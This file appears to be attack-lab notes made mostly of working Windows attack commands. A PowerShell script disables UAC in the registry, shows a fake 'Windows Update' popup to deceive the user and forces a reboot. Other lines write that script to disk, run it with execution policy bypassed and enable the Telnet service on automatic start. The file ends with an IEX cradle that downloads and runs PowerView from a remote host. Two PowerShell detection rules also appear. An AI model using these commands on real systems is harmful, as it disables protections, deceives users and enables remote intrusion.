# -------------------------------------------
# Disable UAC, notify user, auto restart
# -------------------------------------------

# 1. Disable UAC in Registry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
                 -Name "EnableLUA" -Value 0

# 2. Load WPF assemblies for GUI popup
Add-Type -AssemblyName PresentationFramework

# 3. Create popup window
$message = "A system update has been installed and requires a restart.
Your device will restart automatically in 3 seconds."

$title = "Windows Update"
$buttonType = [System.Windows.MessageBoxButton]::OK
$iconType = [System.Windows.MessageBoxImage]::Information

# Launch popup in a separate thread (so restart timer continues)
Start-Job -ScriptBlock {
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show($args[0], $args[1], $args[2], $args[3]) | Out-Null
} -ArgumentList $message, $title, $buttonType, $iconType

# 4. Wait 3 seconds
Start-Sleep -Seconds 3

# 5. Force restart
Shutdown /r /f /t 0

echo Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0; Shutdown /r /f /t 0 > "C:\Users\joe\Desktop\update.ps1"

powershell -ExecutionPolicy Bypass -File C:\Users\joe\Desktop\update.ps1

net start tlntsvr
sc config tlntsvr start= auto
sc query tlntsvr


echo Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0 ^& Shutdown /r /f /t 0 > C:\Users\joe\update.ps1


<rule id="70001" level="10">
<match>powershell.exe</match>
<description>Suspicious PowerShell execution on Windows 7 (no scriptblock logging)</description>
<group>powershell,command_execution,windows</group>
</rule>

 
<rule id="70002" level="8">
<match>Microsoft-Windows-PowerShell</match>
<description>PowerShell activity detected on Windows 7</description>
<group>powershell,windows</group>
</rule>

 



IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.20:80/PowerView.ps1')








